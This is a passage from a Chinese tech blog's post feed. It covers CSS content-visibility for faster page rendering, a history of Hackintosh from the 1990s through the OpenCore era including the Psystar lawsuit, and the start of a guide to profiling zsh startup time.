未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span 